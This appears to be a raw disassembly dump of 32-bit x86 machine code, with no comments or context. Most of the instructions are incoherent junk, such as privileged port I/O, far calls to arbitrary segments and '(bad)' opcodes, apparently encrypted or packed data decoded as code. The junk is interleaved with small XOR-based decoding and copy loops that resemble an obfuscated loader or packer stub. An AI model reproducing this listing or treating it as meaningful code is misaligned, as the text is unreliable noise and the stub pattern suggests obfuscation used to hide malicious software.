  407a96:	mov    ebx,cs
  407a98:	jmp    0x41b36318
  407a9d:	fwait
  407a9e:	jmp    0x407ae8
  407aa0:	jecxz  0x407b21
  407aa2:	stc    
  407aa3:	and    eax,0xd26f14d4
  407aa8:	rcl    BYTE PTR [ecx-0x2ffa66b0],cl
  407aae:	js     0x407a81
  407ab0:	adc    BYTE PTR ss:[ebp+edx*8+0xc],cl
  407ab5:	and    al,0xea
  407ab7:	aas    
  407ab8:	inc    DWORD PTR [esi+ebp*2]
  407abb:	mov    esi,0x72e06bf3
  407ac0:	jge    0x407aed
  407ac2:	pop    es
  407ac3:	xor    dh,al
  407ac5:	sbb    al,0x7b
  407ac7:	dec    esi
  407ac8:	fs lahf 
  407aca:	mov    edx,0xed3ef4f2
  407acf:	iret   
  407ad0:	mov    edi,0x7633fefd
  407ad5:	jl     0x407b16
  407ad7:	or     BYTE PTR [eax],ch
  407ad9:	pusha  
  407ada:	mov    cl,0xe9
  407adc:	push   edi
  407add:	inc    ebp
  407ade:	inc    ecx
  407adf:	sub    BYTE PTR [ebp+0x66],bh
  407ae2:	xchg   esp,eax
  407ae3:	dec    ebx
  407ae4:	les    edx,FWORD PTR [ecx-0x7e353442]
  407aea:	clc    
  407aeb:	mov    cs,WORD PTR [ebx]
  407aed:	fimul  DWORD PTR [edx+ebp*8-0x2b9b875]
  407af4:	cmp    ebx,DWORD PTR ds:[ebx+eax*1+0x9]
  407af9:	xor    BYTE PTR [edx+0x36],0x2d
  407afd:	jl     0x407b51
  407aff:	xchg   ebx,eax
  407b00:	loop   0x407b0f
  407b02:	cmp    al,0xba
  407b04:	shr    DWORD PTR [eax-0x77],cl
  407b07:	scas   al,BYTE PTR es:[edi]
  407b08:	xchg   edx,eax
  407b09:	loop   0x407aca
  407b0b:	jle    0x407b01
  407b0d:	cmp    esi,DWORD PTR [eax]
  407b0f:	cdq    
  407b10:	dec    ecx
  407b11:	div    BYTE PTR [esp+edi*8]
  407b14:	cmp    BYTE PTR [ecx+0x5b],ah
  407b17:	pop    esi
  407b18:	retf   0x7345
  407b1b:	or     cl,bl
  407b1d:	out    0x29,al
  407b1f:	mov    bh,0x2b
  407b21:	out    0x4f,eax
  407b23:	les    esp,FWORD PTR [ebx-0x61932b06]
  407b29:	out    0x54,eax
  407b2b:	push   ecx
  407b2c:	mov    dh,0xc5
  407b2e:	nop
  407b2f:	ds ja  0x407b9d
  407b32:	push   ss
  407b33:	jmp    DWORD PTR [esp+edi*8+0x7b]
  407b37:	mov    eax,0x2d6c4092
  407b3c:	sub    BYTE PTR [eax-0x2b641e3],ch
  407b42:	in     al,0x58
  407b44:	cli    
  407b45:	dec    ecx
  407b46:	enter  0x756b,0xcd
  407b4a:	test   BYTE PTR [edx-0x54],0xe0
  407b4e:	mov    bl,0x11
  407b50:	sbb    edi,edx
  407b52:	pop    ebx
  407b53:	push   cs
  407b54:	push   edi
  407b55:	adc    ah,BYTE PTR [ebx]
  407b57:	xchg   ebx,eax
  407b58:	xchg   ecx,eax
  407b59:	js     0x407afe
  407b5b:	es in  eax,dx
  407b5d:	mov    DWORD PTR [ebx],esi
  407b5f:	loope  0x407ba5
  407b61:	dec    esp
  407b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b63:	pop    ebx
  407b64:	sub    BYTE PTR [edi-0x1d91de79],bh
  407b6a:	mov    ebp,DWORD PTR [edx]
  407b6c:	mov    DWORD PTR [eax+ebx*8+0x191f25d7],esi
  407b73:	mov    al,0xd1
  407b75:	or     ecx,DWORD PTR [ecx+0x58b680a7]
  407b7b:	mov    DWORD PTR [esi],ebp
  407b7d:	ja     0x407bd5
  407b7f:	sahf   
  407b80:	mov    ds:0x8484b90f,eax
  407b85:	imul   edx,DWORD PTR [ecx],0x68
  407b88:	push   cs
  407b89:	in     al,0xdb
  407b8b:	ds (bad) 
  407b8d:	stc    
  407b8e:	push   eax
  407b8f:	sti    
  407b90:	icebp  
  407b91:	ror    DWORD PTR [ebx-0x5a859b4b],0x9c
  407b98:	sbb    eax,0xaa1417c
  407b9d:	or     DWORD PTR [esi],esp
  407b9f:	mov    es,WORD PTR [ebx]
  407ba1:	jge    0x407bb3
  407ba3:	xor    edx,ecx
  407ba5:	add    edx,esi
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0x3575:0x48fdba79
  407cce:	add    ch,cl
  407cd0:	adc    edi,DWORD PTR [esi+0x7e]
  407cd3:	fdivr  QWORD PTR [edi+0x7e]
  407cd6:	jle    0x407cb1
  407cd8:	adc    DWORD PTR gs:[edx-0x567a95f9],ebx
  407cdf:	xchg   esp,eax
  407ce0:	xor    eax,0x24210a93
  407ce5:	xchg   esi,eax
  407ce6:	and    al,0x90
  407ce8:	mov    dh,BYTE PTR [ebp-0x6d8497fc]
  407cee:	test   edx,0x36204d8b
  407cf4:	adc    eax,0xe21172a9
  407cf9:	jnp    0x407d4a
  407cfb:	push   cs
  407cfc:	mov    dl,0x35
  407cfe:	outs   dx,DWORD PTR ds:[esi]
  407cff:	lea    edx,[eax+0x53]
  407d02:	jg     0x407d4b
  407d04:	(bad)  
  407d05:	lahf   
  407d06:	mov    dl,0x4e
  407d08:	pop    ss
  407d09:	les    edi,FWORD PTR [edx-0x2f]
  407d0c:	repz cmp dh,BYTE PTR [ebx+0x4a]
  407d10:	pop    edi
  407d11:	xchg   ebx,eax
  407d12:	xchg   ebx,eax
  407d13:	fcomp  QWORD PTR [ebx]
  407d15:	pop    eax
  407d16:	jb     0x407d80
  407d18:	leave  
  407d19:	jne    0x407d30
  407d1b:	push   edx
  407d1c:	sbb    BYTE PTR [ebx],cl
  407d1e:	and    dh,dl
  407d20:	add    al,0xd6
  407d22:	retf   0xdc22
  407d25:	or     ebx,edi
  407d27:	test   DWORD PTR [ebx],ebx
  407d29:	mov    BYTE PTR [edx],ah
  407d2b:	jl     0x407cdf
  407d2d:	jg     0x407d42
  407d2f:	(bad)  
  407d31:	mov    ds:0x2c293a3d,eax
  407d36:	lds    ebp,FWORD PTR [ebx]
  407d38:	shl    BYTE PTR ds:0xc91e9c26,1
  407d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d3f:	adc    esp,0x54
  407d42:	mov    cl,0x8
  407d44:	jb     0x407ce2
  407d46:	in     al,dx
  407d47:	call   0x54766273
  407d4c:	push   ss
  407d4d:	pop    ebx
  407d4e:	aaa    
  407d4f:	jb     0x407d8a
  407d51:	loopne 0x407d83
  407d53:	dec    esp
  407d54:	jmp    0x407d90
  407d56:	sub    eax,0x6f35a39a
  407d5b:	jae    0x407d33
  407d5d:	adc    ebp,DWORD PTR [ecx]
  407d5f:	sub    ebx,edi
  407d61:	fcomp  DWORD PTR [eax+ecx*8-0x626435e8]
  407d68:	fst    DWORD PTR [ebx+0x29ecb47a]
  407d6e:	xchg   ebx,eax
  407d6f:	or     edx,eax
  407d71:	ss inc edx
  407d73:	out    0x37,eax
  407d75:	mov    ecx,0x4b2a6ce5
  407d7a:	out    dx,al
  407d7b:	(bad)  
  407d7c:	ins    BYTE PTR es:[edi],dx
  407d7d:	pop    ecx
  407d7e:	pop    ss
  407d7f:	sub    cl,ah
  407d81:	imul   ebp,DWORD PTR [edi-0x6916c209],0x4bd6763c
  407d8b:	aam    0xf0
  407d8d:	cs cmp edi,edx
  407d90:	sahf   
  407d91:	in     eax,0x6a
  407d93:	mov    dl,BYTE PTR [edi]
  407d95:	jecxz  0x407d61
  407d97:	sbb    BYTE PTR [ebx+0x16c18826],bl
  407d9d:	test   eax,0x378ebf41
  407da2:	sti    
  407da3:	sub    eax,0x60c0ef1
  407da8:	jno    0x407ddf
  407daa:	inc    DWORD PTR [edx]
  407dac:	test   ebx,edi
  407dae:	pop    esp
  407daf:	cs mov esi,0x9bd7ec08
  407db5:	add    edi,DWORD PTR [ebp-0x30889b18]
  407dbb:	xor    eax,0x73bfa401
  407dc0:	and    DWORD PTR [esi+edx*1-0xa],edx
  407dc4:	ins    BYTE PTR es:[edi],dx
  407dc5:	mov    dh,0x5f
  407dc7:	test   al,0xc4
  407dc9:	sbb    BYTE PTR [ebx+0x2d],ah
  407dcc:	aad    0x4f
  407dce:	enter  0xfc0a,0xe8
  407dd2:	cmp    al,0xae
  407dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd5:	outs   dx,DWORD PTR ds:[esi]
  407dd6:	pop    ebx
  407dd7:	popa   
  407dd8:	inc    ebp
  407dd9:	loop   0x407dca
  407ddb:	pop    eax
  407ddc:	ds int 0x85
  407ddf:	or     edi,DWORD PTR [edi]
  407de1:	loop   0x407def
  407de3:	and    ebp,DWORD PTR [esi+edx*4-0x1]
  407de7:	sub    eax,0xa40f2d8a
  407dec:	xchg   DWORD PTR [edx-0x3c4547c],ebx
  407df2:	int    0x49
  407df4:	cdq    
  407df5:	int3   
  407df6:	out    dx,eax
  407df7:	ss jbe 0x407db6
  407dfa:	pop    edx
  407dfb:	add    eax,0x2113a1d0
  407e00:	and    DWORD PTR [edx],esp
  407e02:	xor    esp,0xc0b151ba
  407e08:	shl    BYTE PTR [ecx],cl
  407e0a:	mov    bh,0x4
  407e0c:	lahf   
  407e0d:	push   ecx
  407e0e:	mov    eax,0x7a0ec4a
  407e13:	gs inc edx
  407e15:	add    al,0x29
  407e17:	inc    edi
  407e18:	and    BYTE PTR [ebx-0x7f],ch
  407e1b:	jno    0x407e1d
  407e1d:	mov    dl,0xeb
  407e1f:	pop    esp
  407e20:	shr    dl,cl
  407e22:	mov    al,ds:0x6c5f2d54
  407e27:	pop    ebp
  407e28:	push   0xffffffa3
  407e2a:	or     al,0xc8
  407e2c:	mov    eax,esi
  407e2e:	out    dx,al
  407e2f:	dec    esi
  407e30:	gs mov ch,0x4f
  407e33:	push   edi
  407e34:	and    bl,al
  407e36:	ret    
  407e37:	push   edi
  407e38:	sub    eax,0x5c7c63b
  407e3d:	loop   0x407dea
  407e3f:	inc    ecx
  407e40:	add    ch,dl
  407e42:	inc    ebp
  407e43:	add    BYTE PTR [eax],al
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR [edi],eax
  407e84:	mov    ebx,0x104f5209
  407e89:	jle    0x407f09
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407e91
  407e90:	shl    bh,0x36
  407e93:	fs add al,0x7b
  407e96:	mov    dh,0xd8
  407e98:	sbb    DWORD PTR [esi+0x13c91087],ebp
  407e9e:	mov    ebx,0xcdfe44a8
  407ea3:	push   esi
  407ea4:	sbb    ah,dl
  407ea6:	jge    0x407e2a
  407ea8:	in     eax,0x28
  407eaa:	call   DWORD PTR [ecx+0x19]
  407ead:	int3   
  407eae:	fisubr WORD PTR [si+0x75]
  407eb2:	daa    
  407eb3:	out    dx,al
  407eb4:	stos   BYTE PTR es:[edi],al
  407eb5:	sub    dl,dh
  407eb7:	xchg   edx,eax
  407eb8:	fs loopne 0x407e6c
  407ebb:	lea    edx,[ecx+eax*8]
  407ebe:	(bad)  
  407ebf:	shl    DWORD PTR ds:0x566587d9,0x31
  407ec6:	dec    edx
  407ec7:	cmp    dh,dl
  407ec9:	xchg   edi,eax
  407eca:	sub    ebx,edx
  407ecc:	sbb    bl,BYTE PTR ds:0xa2d6d5ac
  407ed2:	pop    ds
  407ed3:	xlat   BYTE PTR ds:[ebx]
  407ed4:	push   ecx
  407ed5:	shr    DWORD PTR [eax+0x6f2bf931],0xb1
  407edc:	scas   al,BYTE PTR es:[edi]
  407edd:	lock call 0xab18:0xa8d4dad3
  407ee5:	push   ebx
  407ee6:	hlt    
  407ee7:	lods   eax,DWORD PTR ds:[esi]
  407ee8:	imul   ecx,DWORD PTR [edi-0x73c685a3],0x35
  407eef:	jo     0x407f2d
  407ef1:	fsubr  st,st(6)
  407ef3:	cs div ebp
  407ef6:	call   0xc2e3:0x4b5a57b8
  407efd:	rcr    BYTE PTR ds:0x649a4254,1
  407f03:	and    al,BYTE PTR [edi+0x5]
  407f06:	stos   BYTE PTR es:[edi],al
  407f07:	push   ss
  407f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f09:	inc    ebp
  407f0a:	push   edx
  407f0b:	gs je  0x407f74
  407f0e:	cmp    DWORD PTR [ecx+0x6ccd12a8],eax
  407f14:	call   0x50b6:0x98d8701f
  407f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f1c:	or     dh,cl
  407f1e:	cmp    DWORD PTR [ebp+esi*1+0x5],ecx
  407f22:	rcr    dl,1
  407f24:	iret   
  407f25:	cmc    
  407f26:	pop    edx
  407f27:	clc    
  407f28:	loope  0x407ef0
  407f2a:	or     BYTE PTR [ecx],0xf9
  407f2d:	adc    DWORD PTR [ecx+ebp*4],edx
  407f30:	jle    0x407ecc
  407f32:	pushf  
  407f33:	inc    esp
  407f34:	cli    
  407f35:	or     al,BYTE PTR [ebp-0x50db8f5e]
  407f3b:	sub    esi,edx
  407f3d:	ins    BYTE PTR es:[edi],dx
  407f3e:	adc    al,0x8a
  407f40:	mov    eax,ds:0xcd138c86
  407f45:	jb     0x407f23
  407f47:	(bad)  
  407f48:	js     0x407f8c
  407f4a:	jns    0x407f60
  407f4c:	pushf  
  407f4d:	cmc    
  407f4e:	jecxz  0x407f07
  407f50:	sub    dl,BYTE PTR [esi]
  407f52:	or     DWORD PTR [eax+esi*8-0x33],ebx
  407f56:	inc    ebp
  407f57:	int    0xcc
  407f59:	or     eax,0xbec8f4d9
  407f5e:	sub    cl,0x10
  407f61:	push   ds
  407f62:	popa   
  407f63:	shr    DWORD PTR [ecx+0x61],0xbd
  407f67:	clc    
  407f68:	in     eax,dx
  407f69:	xor    al,0x68
  407f6b:	call   0x2ef6:0x30181bdc
  407f72:	sbb    BYTE PTR [edi+0x4e],dl
  407f75:	into   
  407f76:	or     dl,BYTE PTR [eax+0x74]
  407f79:	jae    0x407f75
  407f7b:	adc    BYTE PTR [ebx],dh
  407f7d:	outs   dx,DWORD PTR ds:[esi]
  407f7e:	adc    ah,al
  407f80:	into   
  407f81:	sti    
  407f82:	call   0x6b92:0x21bc
  407f88:	jmp    0x407f34
  407f8a:	in     al,0xcf
  407f8c:	jb     0x407f97
  407f8e:	enter  0xecb,0x61
  407f92:	jae    0x407fbc
  407f94:	in     al,0x19
  407f96:	push   edx
  407f97:	leave  
  407f98:	jle    0x407f89
  407f9a:	mov    ebp,0xb5c3004d
  407f9f:	ret    
  407fa0:	push   edi
  407fa1:	inc    esp
  407fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fa3:	sar    cl,cl
  407fa5:	lods   eax,DWORD PTR ds:[esi]
  407fa6:	push   0x59c1c8e
  407fab:	enter  0xed75,0xd4
  407faf:	or     al,0x1c
  407fb1:	mov    ebp,DWORD PTR [ebx]
  407fb3:	mov    ds:0x9a598d76,eax
  407fb8:	adc    BYTE PTR [esi],ah
  407fba:	dec    ebp
  407fbb:	out    dx,al
  407fbc:	add    ebp,DWORD PTR [edi]
  407fbe:	aam    0xc
  407fc0:	fcomp  DWORD PTR [esi-0x491ec39a]
  407fc6:	shl    DWORD PTR [ecx+0x3227aff4],1
  407fcc:	add    ch,cl
  407fce:	and    eax,0x32d1dc12
  407fd3:	sub    dl,BYTE PTR ds:0x78b24f22
  407fd9:	sub    ecx,DWORD PTR [ebp+eiz*8-0x2d]
  407fdd:	(bad)  
  407fde:	sub    eax,0x5739881f
  407fe3:	addr16 jno 0x408003
  407fe6:	call   0x447:0x1eed886
  407fed:	mov    ecx,0x339551f3
  407ff2:	rol    DWORD PTR [ebx],0xc2
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	aam    0xec
  408010:	sahf   
  408011:	ins    DWORD PTR es:[edi],dx
  408012:	sub    eax,0xdc7e7e16
  408017:	jg     0x408097
  408019:	jle    0x408036
  40801b:	sub    al,BYTE PTR [ebp-0x43]
  40801e:	adc    DWORD PTR cs:[ebx+0x3d],0x9
  408023:	mov    bh,0xbd
  408025:	cmp    DWORD PTR ds:0xebc34049,ebx
  40802b:	mov    esp,0xca5b42db
  408030:	xchg   edx,eax
  408031:	cs adc eax,0x947d4721
  408037:	mov    al,0xd7
  408039:	fiadd  WORD PTR [edi+0x3a]
  40803c:	test   al,0x74
  40803e:	xchg   BYTE PTR [esi+0x10],dh
  408041:	jg     0x40804e
  408043:	rcl    bh,0x7a
  408046:	dec    edi
  408047:	jle    0x408097
  408049:	rcr    DWORD PTR [edi-0x3926a07f],cl
  40804f:	test   dh,0xc2
  408052:	idiv   DWORD PTR [edi-0x11]
  408055:	sbb    BYTE PTR [edi-0x4e],al
  408058:	sahf   
  408059:	rcr    ebx,1
  40805b:	jns    0x408062
  40805d:	pop    ss
  40805e:	aas    
  40805f:	ins    DWORD PTR es:[edi],dx
  408060:	addr16 xchg ebp,eax
  408062:	cmp    esi,DWORD PTR [ecx]
  408064:	imul   edx,DWORD PTR [esi-0x417d1632],0xfffffff7
  40806b:	dec    ebx
  40806c:	xchg   ebp,eax
  40806d:	stos   DWORD PTR es:[edi],eax
  40806e:	not    bl
  408070:	test   BYTE PTR [ebx],ch
  408072:	inc    DWORD PTR [ebx+0x3c]
  408075:	aas    
  408076:	sbb    DWORD PTR [edx+0x470732f2],ebx
  40807c:	push   cs
  40807d:	pop    ebx
  40807e:	fiadd  WORD PTR [ebx+0x45e5a1ca]
  408084:	push   ebp
  408085:	jle    0x408064
  408087:	data16 xor al,0x5e
  40808a:	push   0xffffff91
  40808c:	sbb    eax,0xd4477b0d
  408091:	add    BYTE PTR [ecx+0x69],0xa6
  408095:	push   ecx
  408096:	cmp    eax,0x90bfc923
  40809b:	pop    edx
  40809c:	push   0xa7c1d7ac
  4080a1:	and    BYTE PTR [edx+edx*4-0x49859f9a],ah
  4080a8:	xchg   esi,eax
  4080a9:	mov    ch,0x19
  4080ab:	je     0x408071
  4080ad:	xor    BYTE PTR [edx],bh
  4080af:	add    al,0x57
  4080b1:	neg    edi
  4080b3:	loop   0x4080af
  4080b5:	push   ss
  4080b6:	(bad)  
  4080b7:	cwde   
  4080b8:	mov    ecx,ds
  4080ba:	popa   
  4080bb:	in     al,dx
  4080bc:	add    DWORD PTR [edx],ebx
  4080be:	js     0x4080f6
  4080c0:	out    0x9f,al
  4080c2:	ins    DWORD PTR es:[edi],dx
  4080c3:	fcomip st,st(5)
  4080c5:	test   eax,0x3a29882f
  4080ca:	fild   WORD PTR [edi]
  4080cc:	mov    ds:0x751b3ba9,al
  4080d1:	pop    ecx
  4080d2:	add    BYTE PTR [edi+0x31725d81],0x52
  4080d9:	push   ebx
  4080da:	out    dx,al
  4080db:	xchg   edi,eax
  4080dc:	not    DWORD PTR [edi-0x77738280]
  4080e2:	stos   DWORD PTR es:[edi],eax
  4080e3:	addps  xmm1,XMMWORD PTR [ebx]
  4080e6:	mov    edi,0xe4fbd577
  4080eb:	dec    BYTE PTR [eax+0x74]
  4080ee:	push   edx
  4080ef:	cmp    al,0x9f
  4080f1:	inc    esp
  4080f2:	mov    ebp,ecx
  4080f4:	or     BYTE PTR [edx],cl
  4080f6:	sbb    DWORD PTR [ebp-0x6b],ebp
  4080f9:	stos   DWORD PTR es:[edi],eax
  4080fa:	out    0x3a,al
  4080fc:	outs   dx,BYTE PTR ds:[esi]
  4080fd:	xor    ah,cl
  4080ff:	fld    QWORD PTR [ebp-0x25]
  408102:	push   esi
  408103:	cmp    DWORD PTR [ebp+eiz*8-0x33adeb29],esp
  40810a:	mov    esp,0x72e9a992
  40810f:	push   ecx
  408110:	push   esi
  408111:	pop    esp
  408112:	and    al,0xc1
  408114:	dec    eax
  408115:	xlat   BYTE PTR ds:[ebx]
  408116:	clc    
  408117:	jmp    0xd1af87f1
  40811c:	pop    es
  40811d:	push   eax
  40811e:	loope  0x4080d1
  408120:	push   esi
  408121:	ds sub cl,bh
  408124:	xchg   edx,eax
  408125:	pop    ebx
  408126:	jle    0x4080ad
  408128:	push   ebx
  408129:	push   ds
  40812a:	adc    al,bh
  40812c:	out    0x93,eax
  40812e:	sbb    BYTE PTR ds:0xe3d27d39,bh
  408134:	stc    
  408135:	sbb    al,BYTE PTR [edi+esi*8+0x18]
  408139:	pop    edi
  40813a:	mov    ecx,0xd51d5b5b
  40813f:	dec    edi
  408140:	mov    esp,0x4f4ef768
  408145:	fstp   QWORD PTR [ebx+0x36]
  408148:	inc    ebx
  408149:	dec    ebx
  40814a:	xor    ebp,0x54601059
  408150:	pop    edx
  408151:	dec    edx
  408152:	ja     0x40815c
  408154:	or     DWORD PTR [edx+esi*2],0xffffffa4
  408158:	cmp    ch,BYTE PTR [ebp+0x4e7127a3]
  40815e:	or     ebp,DWORD PTR [ebp+0xb]
  408161:	inc    ebp
  408162:	or     eax,0x2f25b837
  408167:	push   edi
  408168:	or     ah,dl
  40816a:	mov    ebx,0x75c7bdb7
  40816f:	out    0x9c,eax
  408171:	mov    esp,0x4860dace
  408176:	xchg   DWORD PTR [eax-0x7dbc6bee],ecx
  40817c:	xor    eax,ecx
  40817e:	add    eax,edx
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es fwait
  4081a1:	mov    al,ds:0x17835375
  4081a6:	jle    0x408226
  4081a8:	fdivr  QWORD PTR [edi+0x7e]
  4081ab:	jle    0x40812d
  4081ad:	call   0xa62b:0x55b5214
  4081b4:	xchg   esi,eax
  4081b5:	out    0x86,eax
  4081b7:	mov    dh,0xee
  4081b9:	sti    
  4081ba:	sbb    DWORD PTR [ebx],0x73096027
  4081c0:	mov    ds:0x317a5cb5,al
  4081c5:	aad    0xc2
  4081c7:	pop    ds
  4081c8:	mov    ds:0x17271399,eax
  4081cd:	mov    ecx,DWORD PTR [ebx+0x65]
  4081d0:	pop    esi
  4081d1:	(bad)  
  4081d2:	fs sahf 
  4081d4:	pop    edi
  4081d5:	or     DWORD PTR [ecx+0xca1dd6],eax
  4081db:	mov    edi,0xd4f2e8bd
  4081e0:	inc    ebx
  4081e1:	popf   
  4081e2:	push   cs
  4081e3:	scas   al,BYTE PTR es:[edi]
  4081e4:	fimul  WORD PTR [ebp+0x16dfd6ad]
  4081ea:	nop
  4081eb:	cdq    
  4081ec:	dec    edx
  4081ed:	fidiv  DWORD PTR [eax+0x124e4625]
  4081f3:	mov    bl,0x4d
  4081f5:	and    ebp,DWORD PTR ds:0x90900070
  4081fb:	retf   
  4081fc:	sbb    eax,0xf3f6435f
  408201:	sbb    al,0x84
  408203:	(bad)  
  408204:	pop    ss
  408205:	pusha  
  408206:	mov    ecx,0xde1abe3f
  40820b:	xor    esi,DWORD PTR [ebx-0x30ae377]
  408211:	pop    esp
  408212:	bound  ebp,QWORD PTR [eax-0x44]
  408215:	push   es
  408216:	dec    ecx
  408217:	int    0xbe
  408219:	inc    eax
  40821a:	int3   
  40821b:	push   edx
  40821c:	dec    esi
  40821d:	fs ins DWORD PTR es:[edi],dx
  40821f:	out    0x9,al
  408221:	pop    ds
  408222:	dec    ecx
  408223:	fs xchg esp,eax
  408225:	sbb    BYTE PTR [esp+ebx*4+0x11eaf7eb],ch
  40822c:	(bad)  
  40822d:	jmp    0x4081b9
  40822f:	adc    al,0x18
  408231:	test   ch,0x74
  408234:	push   ebx
  408235:	xor    DWORD PTR [eax],edi
  408237:	dec    esp
  408238:	sbb    bl,BYTE PTR [edi]
  40823a:	into   
  40823b:	fbstp  TBYTE PTR [edi-0x7619cff4]
  408241:	shr    cl,1
  408243:	(bad)  
  408245:	rcl    BYTE PTR [edi-0x3],0xa4
  408249:	setnp  BYTE PTR [edi-0x6b113f7d]
  408250:	ficom  DWORD PTR ds:0xfc242852
  408256:	leave  
  408257:	test   DWORD PTR [esi+0x143787be],esi
  40825d:	data16 or BYTE PTR [edi+0x62fa99cb],0xb0
  408265:	push   edx
  408266:	or     edi,edx
  408268:	loope  0x408259
  40826a:	call   0x6a10:0x27ad1e47
  408271:	outs   dx,BYTE PTR ds:[esi]
  408272:	or     DWORD PTR [ebp+0x9],edi
  408275:	mov    dl,0xb2
  408277:	jno    0x408274
  408279:	pop    edx
  40827a:	loop   0x40828c
  40827c:	xor    dl,BYTE PTR [edi-0x4a7b1214]
  408282:	jae    0x408247
  408284:	(bad)  
  408285:	(bad)  
  408287:	cli    
  408288:	pop    ds
  408289:	aas    
  40828a:	fcom   QWORD PTR [esi-0x25]
  40828d:	repnz xchg edi,eax
  40828f:	mov    edi,0xe4a17dc0
  408294:	and    BYTE PTR [edi+0x193923e8],al
  40829a:	inc    eax
  40829b:	call   FWORD PTR [eax+0x69]
  40829e:	pop    ss
  40829f:	ss out dx,eax
  4082a1:	mov    ebx,0x5ecb75d5
  4082a6:	push   edx
  4082a7:	call   0x74aedb32
  4082ac:	jmp    0x61af:0xc3c4d74f
  4082b3:	gs xchg esi,eax
  4082b5:	jecxz  0x40828f
  4082b7:	mov    dh,0x71
  4082b9:	pmaxsw mm1,QWORD PTR [ebp+0x6896e7e8]
  4082c0:	or     al,bh
  4082c2:	mov    BYTE PTR [edx-0x386da189],bh
  4082c8:	sub    eax,0x1dea1c08
  4082cd:	adc    BYTE PTR ds:0x12ef68b6,cl
  4082d3:	xor    dh,ah
  4082d5:	mov    ds:0xea199e4f,al
  4082da:	out    0x56,al
  4082dc:	ret    0xcbd
  4082df:	dec    edx
  4082e0:	push   ecx
  4082e1:	xchg   esp,eax
  4082e2:	test   DWORD PTR [edi+edx*8-0x2aa69df6],esp
  4082e9:	pop    ebx
  4082ea:	out    0xf6,eax
  4082ec:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082ee:	push   ebx
  4082ef:	ja     0x40836e
  4082f1:	std    
  4082f2:	inc    edx
